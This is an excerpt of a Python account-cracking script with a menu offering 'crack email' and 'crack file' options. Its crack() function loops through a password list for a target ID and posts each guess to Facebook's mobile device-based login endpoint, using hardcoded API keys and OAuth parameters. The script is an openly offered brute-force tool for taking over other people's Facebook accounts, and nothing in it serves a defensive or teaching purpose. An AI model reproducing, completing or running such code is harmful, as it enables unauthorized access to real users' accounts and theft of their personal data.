...
""")
	...
	if ask in ['1','01']:Audio_('data/.crackemail.mp3');clon_email();exit()

	elif ask in ['2','02']:Audio_('data/.crackfile.mp3');crack_file();exit()
	
	elif ask in ['0','00']:Audio_('data/.logout.mp3');exit()
	elif ask in ['',' ',]:Audio_('data/.wrong.mp3');exit(f" [{M}>{P}] PLEASE CORRECT INPUT")
...
def crack(idf,pwx,url,time_xx):
	...
	for pw in pwx:
		try:
			...
			post_method = ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=574dd61f9315d72c7c63fb451f2277d1&skip_api_login=1&signed_next=1&next=https://m.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%228dr7c2lqc74gzedbnx18zm6ym1b1xrga13uxw9k17u74n71aemrbz%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=en_GB&ret=login&fbapp_pres=0&logger_id=7b8719c1-178e-41b0-a951-6eb0e284dd25&tp=unspecified&refsrc=deprecated&app_id=124024574287414&cancel=https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%228dr7c2lqc74gzedbnx18zm6ym1b1xrga13uxw9k17u74n71aemrbz%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_&lwv=101",data=date, headers=head)
